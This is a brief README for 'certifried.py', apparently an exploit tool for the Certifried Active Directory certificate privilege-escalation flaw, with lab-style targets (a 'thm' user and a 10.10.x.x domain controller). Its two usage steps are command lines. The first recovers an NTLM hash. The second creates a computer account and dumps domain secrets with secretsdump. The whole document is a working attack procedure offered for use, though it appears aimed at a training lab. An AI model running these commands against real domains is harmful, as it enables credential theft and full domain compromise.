# Certifried 

## Usage
1. Recover NTLM hash
```
python3 certifried.py lunar.eruca.com/thm:'Password1@' -dc-ip 10.10.154.229 -use-ldap
```
2. Proceed with secretsdump
```
python3 certifried.py lunar.eruca.com/thm:'Password1@' -dc-ip 10.10.154.229 -computer-name Aniq9 -computer-pass 'Password123' -use-ldap -dump
```
